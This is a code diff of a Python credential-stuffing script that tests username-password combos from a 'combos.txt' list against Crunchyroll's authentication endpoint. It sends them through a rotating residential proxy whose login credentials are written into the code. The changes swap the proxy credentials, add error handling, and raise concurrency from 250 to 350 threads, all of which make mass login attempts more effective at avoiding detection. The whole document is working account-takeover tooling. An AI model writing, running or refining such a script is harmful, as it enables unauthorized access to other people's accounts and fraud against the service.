@@ -40,7 +40,7 @@ def create_session_with_retry(retries=3, backoff_factor=0.3, status_forcelist=(5
     return session
 def check_account(username, password):
 
-    proxy = "gw.thunderproxies.net:5959:thunderpJ9pPsBU37O-dc-US:xBKtWmWTvzXUvS843F"
+    proxy = "gw.thunderproxies.net:5959:thunderZ7lW7KfS10U-dc-ANY:htmnjzTbJxsUXZw49J"
     ip, port, user, pwd = proxy.split(":")
     proxy_dict = {
         "http": f"http://{user}:{pwd}@{ip}:{port}",
@@ -68,10 +68,14 @@ def check_account(username, password):
         "password": password
     }
 
-    response = sess.post(
-        url="https://beta-api.crunchyroll.com/auth/v1/token",
-        data=data,
-    )
+    try:
+        response = sess.post(
+            url="https://beta-api.crunchyroll.com/auth/v1/token",
+            data=data,
+        )
+    except requests.exceptions.ChunkedEncodingError as e:
+        print(f"Error occurred while checking username '{username}': {str(e)}")
+        return False
 
     try:
         res_data = response.json()
@@ -118,7 +122,7 @@ accounts = read_accounts_from_file('combos.txt')
 total_accounts = len(accounts)
 print("Total accounts imported:", total_accounts)
 
-max_threads = 250  # Adjust the number of threads based on your needs
+max_threads = 350  # Adjust the number of threads based on your needs
 with ThreadPoolExecutor(max_threads) as executor:
     results = executor.map(process_account, accounts)
 
